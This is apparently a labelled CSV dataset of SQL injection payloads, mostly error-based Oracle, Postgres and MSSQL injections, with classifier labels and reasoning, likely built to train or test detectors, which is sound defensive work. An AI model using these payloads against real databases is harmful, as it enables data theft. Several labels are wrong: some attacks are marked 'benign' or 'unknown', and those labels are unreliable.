id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
36357,1 ) ) as xoch where 8765 = 8765 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1 ) ) as xoch where 8765 = 8765 and 3754 = ( select upper ( ,3
36358,1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xm,3
36359,"1\'|| ( select \'hlxd\' from dual where 2615 = 2615 or username = ""-4256\' ) where 9545 = 9545 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,1.0,Token 'ctxsys.' → error_based (priority 4); DB=oracle. Evidence in payload: 1\'|| ( select \'hlxd\' from dual where 2615 = 2615 or usern,3
36360,"select * from users WHERE username = ""-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846"" or username = ""-9840\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36361,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr (,3
36362,"-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'ajka\' = \'ajka",error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: -7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +cha,3
36363,"SELECT * FROM users WHERE username = ""1\'|| ( select \'ftey\' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\'"" AND username = ""1 ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36364,"select * from users WHERE username = ""1\'+ ( select \'pvej\' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" or username = ""-2495 ) ) as hudw where 4197 = 4197",error_based,oracle,1.0,"Token 'ctxsys.' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1\'+ ( select \'pvej\'",3
36365,-2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # gwqv,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: -2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ,3
36366,"select * from users WHERE username = ""-3458\' ) where 2053 = 2053 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" and username = ""-9501\' )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36367,"select * from users WHERE username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'sdnc\' = \'sdnc"" and username = ""-8860 )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36368,"-8057\' ) ) as gpue where 4205 = 4205 or username = ""-2992\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'tjgt\' = \'tjgt",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36369,"1\' in boolean mode ) or username = ""-8021\' ) ) and ( ( \'cenk\' like \'cenk",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
36370,"1\'+ ( select sshu where 3442 = 3442 and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36371,"select * from users WHERE username = ""-4108\' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) as tgqd where 6369 = 6369",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36372,1 ) as lvfu where 5831 = 5831 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36373,"1\' ) ) ) and username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'rggg\' = \'rggg",error_based,oracle,1.0,"Token 'ctxsys.' → error_based (priority 4); DB=oracle. Evidence in payload: 1\' ) ) ) and username = ""1\' ) ) and 6055 = ctxsys.drithsx.",3
36374,1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr (,3
36375,-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: -4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype (,3
36376,"-5152\' ) ) or username = ""-5013\' ) ) ) and ( ( ( \'ehwh\' like \'ehwh",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
36377,"select * from users WHERE username = ""1"" or username = ""1%\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1"" or username = ""1%\'",3
36378,"select * from users WHERE username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723"" or username = ""1\' )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36379,"select * from users WHERE username = ""-4811%\' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'%\' = \'"" and username = ""-4256\' ) where 9545 = 9545",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36380,-3458\' ) where 2053 = 2053 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36381,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""1 ) ) as xoch where 8765 = 8765 or username = ""1\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36382,1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xm,3
36383,"select * from users WHERE username = ""-9501\' ) and ( \'mndw\' = \'mndw"" and username = ""1 ) ) as atiy where 3855 = 3855",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36384,"select * from users WHERE username = ""-7746\' ) ) ) and ( ( ( \'itxy\' like \'itxy"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36385,-7710\' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36386,"select * from users WHERE username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx"" and username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""-6665\' ) ) ) and ( ( ",3
36387,"1 ) ) as xoch where 8765 = 8765 or username = ""1\' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: 1 ) ) as xoch where 8765 = 8765 or username = ""1\' ) where 1",3
36388,1\' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( \'rjjo\' = \'rjjo,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
36389,"select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" and username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,1.0,"Token 'ctxsys.' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1\'|| ( select \'yucg\",3
36390,"select * from users WHERE username = ""1 where 5161 = 5161 and username = ""1\'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and username = ""1\' ) ) )",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1 where 5161 = 5161 an",3
36391,-6190\' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: -6190\' ) where 2621 = 2621 or 4144 = ( select upper ( xmlty,3
36392,-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,1.0,Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: -1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper (,3
